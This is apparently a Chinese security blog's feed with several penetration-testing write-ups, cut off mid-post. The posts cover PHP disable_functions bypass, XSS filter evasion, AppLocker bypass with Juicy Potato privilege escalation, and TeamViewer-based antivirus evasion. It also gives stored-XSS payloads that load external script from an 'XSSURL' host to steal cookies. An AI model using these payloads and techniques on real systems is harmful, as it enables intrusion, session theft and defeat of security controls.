href="#0x04-bypass-disable-functions" class="headerlink" title="0x04 bypass disable_functions"></a>0x04 bypass disable_functions</h1><p>查看禁用</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/11.png"></p><ol><li><p>一开始没仔细看禁用的内容，直接就用了这个</p><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a> </p></li></ol><p>但是发现putenv被禁用了</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/12.png"></p><ol start="2"><li>换个方法，通过这篇文章</li></ol><p><a href="https://mochazz.github.io/2018/09/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E7%BB%95%E8%BF%87PHP%E7%9A%84disable_functions/">https://mochazz.github.io/2018/09/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E7%BB%95%E8%BF%87PHP%E7%9A%84disable_functions/</a></p><p>了解到利用pcntl扩展，确认系统支持</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/13.png"></p><p>最终成功执行命令</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/14.png"></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;文章首发无法溯源安全团队公众号&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="PHP" scheme="https://www.se7ensec.cn/tags/PHP/"/>
    
    <category term="GetShell" scheme="https://www.se7ensec.cn/tags/GetShell/"/>
    
  </entry>
  
  <entry>
    <title>某某街一处XSS的绕过思路</title>
    <link href="https://www.se7ensec.cn/2020/02/06/%E6%9F%90%E6%9F%90%E8%A1%97%E4%B8%80%E5%A4%84XSS%E7%9A%84%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/"/>
    <id>https://www.se7ensec.cn/2020/02/06/%E6%9F%90%E6%9F%90%E8%A1%97%E4%B8%80%E5%A4%84XSS%E7%9A%84%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/</id>
    <published>2020-02-06T15:10:24.000Z</published>
    <updated>2020-11-14T19:56:20.594Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>众测吃便便</p></blockquote><a id="more"></a><h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>疫情影响，过年放假呆在家里实在无聊，上去某平台看了下众测项目，想着挣点口罩钱</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.06/1.png"></p><h1 id="0x02-直接闭合"><a href="#0x02-直接闭合" class="headerlink" title="0x02 直接闭合"></a>0x02 直接闭合</h1><p>一开始尝试直接去闭合<code>&lt;a&gt;</code>标签，发现 <code>&quot;&gt; </code>输出时会被实体化编码，遂放弃</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.06/2.png"></p><h1 id="0x03-javascript-伪协议"><a href="#0x03-javascript-伪协议" class="headerlink" title="0x03 javascript 伪协议"></a>0x03 javascript 伪协议</h1><p>因为输出是在<code>&lt;a&gt;</code>标签的 <code>href</code> 里面，所以去尝试伪协议，payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(document.domain) </span><br></pre></td></tr></table></figure><p>提交后发现，输出的内容直接过滤掉了 <code>javascript: </code></p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.06/3.png"></p><p>经过几次尝试，通过以下payload绕过了过滤，成功弹窗</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javas&amp;Tab;cript:alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.06/4.png"></p><p>不过一个小破弹窗怎么能证明危害</p><h1 id="0x04-绕过限制加载外部js"><a href="#0x04-绕过限制加载外部js" class="headerlink" title="0x04  绕过限制加载外部js"></a>0x04  绕过限制加载外部js</h1><p>直接用了xsshunter的payload，提交点击后，发现执行不能成功</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.06/5.png"></p><p>仔细对比下输出的内容和原始内容才发现，输出时所有的字符都强制转换小写了</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.06/6.png"></p><p>这里先了解下xss中的 <a href="https://www.cnblogs.com/milantgh/p/4246342.html">编码问题</a>，eval中支持Unicode编码，最终构造的payload把大写的字母单独编码下即可</p><p>最终效果：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.06/7.png"></p><h1 id="0x05-报送结果"><a href="#0x05-报送结果" class="headerlink" title="0x05 报送结果"></a>0x05 报送结果</h1><p>本来以为好歹能混个中危，结果厂商认为这个点需要点击交互，给了低危。</p><p>申诉：评级的时候看下功能点，毕竟本来就是需要点击的业务功能。</p><p>厂商反馈：经过讨论，恶意链接为javascript开头利用难度较高，故维持评级低危。</p><h1 id="给👴爪巴"><a href="#给👴爪巴" class="headerlink" title="给👴爪巴"></a>给👴爪巴</h1>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;众测吃便便&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="XSS" scheme="https://www.se7ensec.cn/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>回炉再造</title>
    <link href="https://www.se7ensec.cn/2020/01/20/%E5%9B%9E%E7%82%89%E5%86%8D%E9%80%A0/"/>
    <id>https://www.se7ensec.cn/2020/01/20/%E5%9B%9E%E7%82%89%E5%86%8D%E9%80%A0/</id>
    <published>2020-01-20T07:15:15.000Z</published>
    <updated>2020-11-14T19:56:49.726Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>安全技术学习，承认自己的弱点不是丑事。<br>只有对原理了然于心，才能突破更多的限制。        ——@ringzero </p></blockquote><a id="more"></a><p>一二三四，二二三四，转个圈圈，再来一次。</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;安全技术学习，承认自己的弱点不是丑事。&lt;br&gt;只有对原理了然于心，才能突破更多的限制。        ——@ringzero &lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="生活随笔" scheme="https://www.se7ensec.cn/categories/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/"/>
    
    
    <category term="随想" scheme="https://www.se7ensec.cn/tags/%E9%9A%8F%E6%83%B3/"/>
    
  </entry>
  
  <entry>
    <title>迟来的年度总结</title>
    <link href="https://www.se7ensec.cn/2020/01/09/%E8%BF%9F%E6%9D%A5%E7%9A%84%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
    <id>https://www.se7ensec.cn/2020/01/09/%E8%BF%9F%E6%9D%A5%E7%9A%84%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</id>
    <published>2020-01-08T18:15:44.000Z</published>
    <updated>2020-11-14T19:56:10.114Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="534930972233cbd4101a9868038658fa4e5e432fda5ca8f68f13d48ac067ee09">1415c66757eec6f3f6373e1124982d58b3311bc876bcb0e0397e49af7fef20a7a6316d6b8cef3257b49f69802ec2a857daa3eca0da76f6b62b5ab2679256ece792b20a06af3bbbea36e5725f35a2308e07513261f90a47532744398b828434342d525d08530213403c4f832fc796ab663cfaa9e8f6e5625f43551d1066e92075a34484bd6bb65bf3393436d5bd8b938d46dc2a7f0205367c373b989ce6547a08ab633e5ea94314b26c663795b11f992d6fe557a90417facf2230ef19a64b7cf2856fb32a3011eb65cdbc419cc1593616ac7a26ee98bfbdc5172531aa34436be1efec9319199b8a9acc708c81fa38fd9402fd34f12dfd440c3e973096417ff338b953b9e2fb67e441e007082c889ba2b5c6b282e3117f411abad6a405722ce911309c472e3f26b504552fd287458a89b447a25635fab0bf1f3641dffe005b52665d1283ed8532854d5b9a9e196a79adc60c18bab21853c25c0f5bc3dfbb23ba96c208cd4a9508d4a3ba0c707346e9465771864b2b189c3d7a85548b8ba939962d24ff042469117238f253e4ccab7ae2df391f9444aceeb03bd4431cc64b4acbf98fb56c0f5c0fa0490f992e714c786ec75b13b925b1c89d2a40148db4db0ceb5abcd5795f024eb71fb3e5fed4dcea0e34cc1ac18710f86fc391f0fd426f26f56f12add483622cb03076a2ced6e1324af49a254628837715bc34c75c966fa8d5f312c5dcd493582529c0420e62f29a77a2bb6c22aea978a57b1a7dde5407b631cadf9ea3865f4f165e0aa5e500a750f057ea75ac3aad2a1420eb66805d6b27210e747e130d7b2df950a3c83cff313689c455c8e02416982bd95806ab4cda6475f05dcd17348b283c40038f98ce1b8b5bbdd49ecc66fb7327de265bdaa259f5e424e60092deaf02f2221b7eb0b09b31d83c6918b0ef841709d5a3d6719b1d4bbcfa7814f3409e246b069f1693302f76675e7d4bc29dd885b7a57fe7135cb5b9b50fc1a12ae6de10f00994e32b688bb0b4e298dc4f45950c66c18fe35c02b77eeeaf9af932b26d9d15a29fcbffcd6e8c2190d8893e0965c1a4077695b98a30c3fdbfa064da21bd018aa3f879cefeb254df2725afff0c4f4e6166775f852c0b4605a5871807e549b63ba5e1685c0731bfd7da36287c96f66bd4738e181cc9f7540a0d30cac9636b864372dfb565942d6fec07e437b939609d09fbe677b19897fb586e2f41b9d04571e506bc27d68239fee05c85fbbede736eef2141bbe82f5a2bf4c751bddbd87b8d84bbaf83af1fa00fd00895f389930deb7e7023e583b2cc1ac8066ef60662e3648849151c74d63f3ff894a0860b6252a3196b8b7cd5c297321262e25b83388260771baa1410e111ad4306a6dcdf300f0ca4b4a45076d8ee1f1e5fd96dd17c33e817a2a5a2911de6c5133835933115c3682e81c34ceb61f5d0c8ab56bfc9436347ae706421731cc7f9db3d6ebd9794baf05315654bc18091fd2e51322101f312fadee992794176dfe3b6d7a29c20f01270a467299fd7ff778e988d5f6799396ef61ddc48766b873c7c8f12b8f3c11402a7c28ee1bcf1b1f07d5748da29cc72f81c12f2d8a84b7646c491f49509ea2d8110312cf7ad2688b296ec1ca78d70837b78611009743eb3b6297a64bb1d5feb565bc9a43d8d997c93b3845eeee7fd2a82d6a88a25bde18e645462ef6db483f21c5a7fa3cfad8ce42be872aa171dee7755f78db591f5c67378d3f9f4f227476ec40db35975d8d20f78664e58ad68a55d259485926002d41769fad0b39b5b0cafc99f07497986dea625db4b01a911c0a667edd48296fa77cecd8e440739a91883503dccf39f7004883822f0ff2e7fd60eef5c69bc54b15189f0c89211da3f4aa9e509039635f13632d53d47aef91545432f3aa1dbefcd0966868134ad9dbb9e7fda3a4577fba4111eea75f1faa82bd4f818dde4780b2411b4c5cee96f10c768cee4c1785b66369721d84d34e6edffa9573b851ee9d4d0d7dc83aaa17fb50c15434e58fcba7349d3190ebfd038be1787fdf938f8eb5c65cfb02fe467815df757e137a3662d4765bf72f3518362b42ed1e24dd1c6f3def7d0dbab6f7b301c047ae7950abee021d04bcc1ca6b38fd86a5529035c9235ae5cb029d9af067a993bb228e5d7e80661dd667b6308f6d22031044cb59c189feae021b65deba22a7cfe5db0532502be597c78a305f3ba8b38f3fadd883fea2f36260e322bc453e71ea666c13ef921b1b53b3881d29efb8e28d1da65585090559b5603769260b1b14f0f92eb94a76d17c0b589db384900290cb6729d4d7a7974400c00d6e3a65de57a7bc9b721ae9d6136236b1ceeddf98767b16251a11a6db62c8c7df20a6266a925dc26e18f3f07d6bb26238e2a379e4e5196bf0b4f2c5152f8abfaef4f537731503e4a031b4c344dcd3f7759337289a3f9ca92a28affe7d1e8ad810beac63f29d68c47e696f71708fbafeb174059d53228bc40f954aa429ac570b5dba7db6753cd40164d735ca17095aaf809fc74103bd230d46c86929c38863e70409c0636c36be43b3091b8d275011511075f10e52dbdf3591efbe52ad13673ce5e25a3a11afabdadb6b9ee82bfeb35ee5c8b6a73c70b1ecfaaea5c8cbd1a8f7538563101eae35ef0c20a08e189ee3112bb9342fee7d759be3083cdb37f985be5d0460f17ec174f019d27911d306ffd6ffb33004e5f834aa611f5cfee7fc70e61fa833383f5dcca7224a17be538af53688a75e3928bbfcc1aab2bc5d0db1ce0a6f7363e5aae17ccc35c802cb71f773581362f04f4a11e18ccad57bf4526d9f65222eb8466f1454b93bf0b07f71c46edfad570c6ab048c615226e67e7adfba11e6fd45ff2c8db3000b157941abcba42fd21082f65a542af7c6d639420474ccbd7dc1a196a7cf230211721276faf9149f3e1f8261df8faa2b8fb989eb94e9d7e12b421f9242c62d37e3b97b970d481d4a1d704604d2c8cad97aab4ecbdae3ed295eb1f56f1cf2b3376d4226c6fdf61f596ebf6d7d2524c0a0a7680c614064ac590265148bf7b9b94dc622bb4e9cb892b63d75114ad505ca47ceeb797fba792298927eb2a41687b1e187bb97a0ab1645a9516a8cea6274bf3fc88e823e4e654288c4cddd1be194d6400c8d6cc97658f333cd2240bf24ece83a62425a55627dff51169777144d56d08725e9a855d9c3aaa8488497eac968be0ed5d90247227f2559dd33768106fedadf02decaf4058a8c0aa602aa140bd28bcfd1ca3663ce55ff2effe5515e711a1fdd3ff4c96faca64cdd48a8b0175ee95c4ca138ca45eb5a147eba8213e338d608fafce8e72d4f65c3e6f904286f9d3895f814cb78b22882379fe25678e4ed2afac401e7ce0af76cf83a33f5624939eb777af54cd713b297987c0a8b90bce0607f49bbfce9368ffb237789d889bd3d287634e157f9c177c7bd3c58a4bb9f9f2baae152840a522ce6038367684e77746e9cd9b0a6ccab27777cbd63b22c6a88de91aeea205399058ca10bb1bd0f99d09831cc6c2f839f0dc9a111a1c246d9cca3a9edafc9fe79f89863e891e96e9d75a6b6d880ed69cbc57f5f534b3793a445f71d394e6fca430046223c8a94d3da0a0c047ca0cd64c19b2f9759daad0412afe216cb8563a18e9166ffc0319e27ed85a6d17f080b6b5bf6d689cc28d506197df5d9fac04e2906cc700426f91ccb48b9235175551ced722c7843d9957bfa6068f313930ce5a5146a1fe7565d38f46685f75a24610e8c681a93c2625e9170658b6385a34b948c81add187ace312f79371835394b95b3fbb8e72cf57bdaedabcffefac1f42e06b6a11e0c9d2ed7ff31a7bae3885f2d4b3243db1972e5dea3834035eaeabf1ee79a7d0ecc978f75c163db5d9dd3502ac450fe09e6427893fe40a15a59a7794c3419ad46d44b3f6523d1f22666d6b407d18e5f59c4fea0e99a1e9968d645a4f69fd4f46a83db72435762ced0e58027e48fe186aa8e17a9bf466e9deddfe85203b66bbae38f2749cc937e3844dbcb2d4d7ea305b57d81d840dbc31a7c4a31a979f347494f20be63e6e02cfb79b466ce79ee4fadab088c1d5367f5aaf742d5619ac34cefc3a8f7741d4e721e32f8174d77a9b352aa359ff6326e28b8802</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="生活随笔" scheme="https://www.se7ensec.cn/categories/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/"/>
    
    
    <category term="随想" scheme="https://www.se7ensec.cn/tags/%E9%9A%8F%E6%83%B3/"/>
    
  </entry>
  
  <entry>
    <title>BC实战|后渗透之Bypass Applocker到提权</title>
    <link href="https://www.se7ensec.cn/2020/01/08/BC%E5%AE%9E%E6%88%98%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8BBypass%20Applocker%E5%88%B0%E6%8F%90%E6%9D%83/"/>
    <id>https://www.se7ensec.cn/2020/01/08/BC%E5%AE%9E%E6%88%98%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8BBypass%20Applocker%E5%88%B0%E6%8F%90%E6%9D%83/</id>
    <published>2020-01-07T16:10:24.000Z</published>
    <updated>2020-11-14T19:57:04.506Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>冷静分析，沉着应对。</p></blockquote><a id="more"></a><h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>提示：当个反面案例看就好，实际上拿下的方式远没有下文说的那么麻烦，只怪自己太心急…<br>本来是之前BC项目搞下来的一个推广站，当时只拿到了Shell</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.08/1.png" alt="1"></p><p>权限是一个普通用户，想提权进一步收集服务器上的信息时，发现运行各种东西都是权限拒绝，提示组策略阻止了这个程序，当时因为还有的别的事情，就没继续研究了（用户名比较敏感，后面全程打码）。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.08/2.png" alt="2"></p><h1 id="0x02-Bypass-Applocker"><a href="#0x02-Bypass-Applocker" class="headerlink" title="0x02 Bypass Applocker"></a>0x02 Bypass Applocker</h1><p>最近突然想起来了，就继续搞一下，问了下群里的师傅</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.08/3.png" alt="3"></p><p>知道是什么东西以后就好说了，耐心找一找总会有收获的，附上Applocker介绍：</p><p><a href="https://baike.baidu.com/item/Applocker/2300852?fr=aladdin">https://baike.baidu.com/item/Applocker/2300852?fr=aladdin</a></p><p>然后就找到3g师傅的一篇文章：</p><p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-msxsl-to-bypass-AppLocker/">https://3gstudent.github.io/3gstudent.github.io/Use-msxsl-to-bypass-AppLocker/</a></p><p>具体怎么利用就自行看文章吧，看完文章后续的大概思路差不多就清晰了</p><h1 id="0x03-上线到提权"><a href="#0x03-上线到提权" class="headerlink" title="0x03 上线到提权"></a>0x03 上线到提权</h1><p>我想的是bypass applocker让目标服务器执行我的马子上线后在进行后续的提权，然而Shell下执行 net user、tasklist /SVC 等等都没得回显，不然可以通过进程对比判断下杀软（自己写的小轮子，目前可匹配进程已经增加到960+了：<a href="http://get-av.se7ensec.cn/%EF%BC%89">http://get-av.se7ensec.cn/）</a></p><p>既然不知道，那我就拼一拼人品，赌一下主机里没有杀软，通过上面3g师傅文章的第三种方式运行了我的马子，然后就成功上线了，忽略下面那个机器…</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.08/4.png" alt="4"></p><p>CS上线以后再运行某些命令，比如下面这个，还有tasklist /SCV发现还是会拒绝访问</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.08/5.jpg" alt="5"></p><p>然后又尝试了下CS内置的查看系统进程命令 ”ps“，成功列出了系统进程，看了下确实是没有杀软的</p><p>/* 忘了截图 */</p><p>运行 “shell systeminfo” 发现系统和补丁信息居然可以看到了，然而系统根本没打几个补丁，运气有点好，看了下用户权限，符合Juicy Potato的要求，可以直接尝试下烂土豆提权：</p><p><a href="https://www.4hou.com/posts/vZoL">https://www.4hou.com/posts/vZoL</a></p><p>经过测试发现上线以后（实际上本来就有执行权限，当时没有想到不对劲，事后总结文章时才意识到不太对，详见文末），C:\Users\Public\下有了执行权限，用Juicy Potato带个whoami参数执行下，成功返回了system</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.08/6.png" alt="6"></p><p>再直接用它执行下马子，等几秒就会过来一个System的会话了，翻了翻目录发现还是个站群</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.08/7.png" alt="7"></p><p>Administrator权限截个屏看下，怪不得那么多，原来人家都是批量建站的：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.08/8.png" alt="8"></p><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>碰巧这次运气好没有遇到杀软，不然肯定会是一路坎坷，也会更有挑战性</p><p>最失败的是这次自己没有提前全面了解Applocker的一些功能介绍： <a href="https://www.anquanke.com/post/id/159892">https://www.anquanke.com/post/id/159892</a> ，心急的搜到了bypass方法就开始用，其实这次遇到的只是文件路径的限制，C:\Users\Public\就可以执行程序，早一点发现的话也不会那么费劲，不过能完整了解到Applocker的机制，也算是一个收获吧</p><p>最后感谢下haya、Beli1v1师傅的指点和帮助。</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;冷静分析，沉着应对。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="WIN提权" scheme="https://www.se7ensec.cn/tags/WIN%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>TeamViewer在BypassAV中的妙用</title>
    <link href="https://www.se7ensec.cn/2020/01/05/TeamViewer%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%A6%99%E7%94%A8/"/>
    <id>https://www.se7ensec.cn/2020/01/05/TeamViewer%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%A6%99%E7%94%A8/</id>
    <published>2020-01-04T18:10:24.000Z</published>
    <updated>2020-11-14T19:57:29.049Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>这里直接拿360开刀，火绒安静归安静，杀毒能力还是比360差点的。</p></blockquote><a id="more"></a><h1 id="TV官方免安装版"><a href="#TV官方免安装版" class="headerlink" title="TV官方免安装版"></a>TV官方免安装版</h1><p>这是teamviewer官网下载页面： <a href="https://www.teamviewer.cn/cn/download/windows/">https://www.teamviewer.cn/cn/download/windows/</a> ，大部分人都习惯直接下载这个安装版来用</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.05/1.png" alt="1"></p><p>不知道大家有没有注意过，其实teamviewer也提供了免安装版的，就在安装版的下方</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.05/2.png" alt="2"></p><h1 id="Bypass-360"><a href="#Bypass-360" class="headerlink" title="Bypass 360"></a>Bypass 360</h1><p>以下全部为联网且查杀引擎全开的情况下操作（见文章封面）</p><h2 id="正常运行"><a href="#正常运行" class="headerlink" title="正常运行"></a>正常运行</h2><p>下图是正常方式运行TeamViewerQS.exe，虽然有提示，但是可以看到默认的选项是 <strong>允许操作</strong> 的</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.05/3.png" alt="3"></p><h2 id="WebShell下运行"><a href="#WebShell下运行" class="headerlink" title="WebShell下运行"></a>WebShell下运行</h2><p>假设现在我有这台主机的WebShell，直接在大马中执行这个文件</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.05/4.png" alt="4"></p><p>发现成功弹了出来</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.05/5.png" alt="5"></p><p>但是我们怎么获取id和密码呢，土司有大佬分享过修改过的tv，支持把账号密码输出到文件，但是后期肯定还是会被杀，今天看到了CoolCat师傅的文章：<a href="https://xz.aliyun.com/t/4078">传送门</a>，文章中有个通过截屏思路获取还是不错的，不过CoolCat师傅用的python截屏，实际上谁也不想每次都去目标机上装个python环境吧，还是应该怎么简单怎么来</p><h2 id="关于屏幕截取"><a href="#关于屏幕截取" class="headerlink" title="关于屏幕截取"></a>关于屏幕截取</h2><p>github上有不少命令行下截屏的项目，我随便找了一个：<a href="https://github.com/darealshinji/cmdline-screenshot-tool">https://github.com/darealshinji/cmdline-screenshot-tool</a></p><p>在WebShell中，执行一下 screenshot-advanced64.exe，发现被360拦截了，c++写的东西360报java漏洞攻击我就不清楚为啥了…</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.05/6.png" alt="6"></p><h2 id="简单绕过360"><a href="#简单绕过360" class="headerlink" title="简单绕过360"></a>简单绕过360</h2><p>这里绕过方式也很简单，screenshot-advanced64.exe 的后缀改成.7z（命令行下执行二进制文件可以无视后缀名），然后上传上来再执行</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.05/7.png" alt="7"></p><p>然后看一下网站根目录</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.05/8.png" alt="8"></p><p>screenshost.png就是生成的屏幕截图，如下</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.05/9.png" alt="9"></p><h1 id="Kill-360"><a href="#Kill-360" class="headerlink" title="Kill 360"></a>Kill 360</h1><p>拿着账号密码直接连，有了远程桌面的权限，360还怕干不掉？</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.05/10.png" alt="10"></p><h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><ol><li><p>目标机要确定可以连接TeamViewer的服务器</p></li><li><p>要使用远程桌面用户权限去运行TeamViewerQS.exe，不然连上也是黑屏</p></li><li><p>以上应用场景只适合管理员不在的时候，因为一旦建立远程会话双方都是会看到的</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;这里直接拿360开刀，火绒安静归安静，杀毒能力还是比360差点的。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="BypassAV" scheme="https://www.se7ensec.cn/tags/BypassAV/"/>
    
  </entry>
  
  <entry>
    <title>BC实战|从Xss到主机上线</title>
    <link href="https://www.se7ensec.cn/2019/12/08/BC%E5%AE%9E%E6%88%98%E4%BB%8EXss%E5%88%B0%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF/"/>
    <id>https://www.se7ensec.cn/2019/12/08/BC%E5%AE%9E%E6%88%98%E4%BB%8EXss%E5%88%B0%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF/</id>
    <published>2019-12-08T15:10:24.000Z</published>
    <updated>2020-11-14T19:57:14.876Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>要保持学习的好习惯，这次平时学的就用上了。</p></blockquote><a id="more"></a><h1 id="故事的起因"><a href="#故事的起因" class="headerlink" title="故事的起因"></a>故事的起因</h1><p>前几天收到一封邮件，内容是这样的：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/1.png" alt="1"></p><p>你说发谁哪里不好，发到我这里来，正好最近辞职了没事干，搞下看看。</p><p>加上那个人的好友以后，象征性的聊了几句，大概就是：我说自己因为网赌没钱借了高利贷，让他带我玩这个，好还上贷款，没说几句就给我发了网址和邀请码（这个站没邀请码注册不上），让我去网站里面充钱，我说好，我先去冲一千，完事师傅你一定要好好带我，然后就去注册了（后来我没充钱，他就一直抖我，给我发消息，觉得烦就把他删了，所以聊天记录也没了，简单口述下没截图）。</p><h1 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h1><h2 id="官网截图"><a href="#官网截图" class="headerlink" title="官网截图"></a>官网截图</h2><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/2.png" alt="2"></p><p>信息收集阶段略过，太麻烦了，有云盾（WAF+CDN），看下面云悉指纹识别的图吧，测试各种功能点，没有结果，不得不说，大部分BC安全都是做的不错的。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/3.png" alt="3"></p><p>想了会，看到一个聊天室功能，进去看看都在说啥，结果发现说话来来回回就那几个人，偶尔有几个和我一样的普通会员，我就感觉，这尼玛是不是托啊，一堆什么导师嚷嚷着跟着下注。</p><h2 id="职业习惯："><a href="#职业习惯：" class="headerlink" title="职业习惯："></a>职业习惯：</h2><p>看见框就想叉，一发xss payload打过去：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;tExtArEa&gt;&#39;&quot;&gt;&lt;sCRiPt sRC&#x3D;XSSURL&gt;&lt;&#x2F;sCrIpT&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/4.png" alt="4"></p><p>wdnmd没反应？明明加载了啊…问了下别的师傅，说这种情况有可能是有CSP，附上<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP">相关介绍</a>，我这里就不解释了，本来打算放弃，想了下万一 img 的没有被限制呢。</p><p>再吃我一发：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;x onerror&#x3D;s&#x3D;createElement(&#39;script&#39;);body.appendChild(s);s.src&#x3D;&#39;XSSURL&#39;;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/5.png" alt="5"></p><p>叮 ~ 叮 ~ 手机响了，多么美妙的声音，payload成功执行，打来一堆cookie（还是不同域名），然而现实是残酷的，这个站有HttpOnly，cookie不能用，历史密码也没拿到，不过不要灰心，咱还有更猥琐的办法。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/6.png" 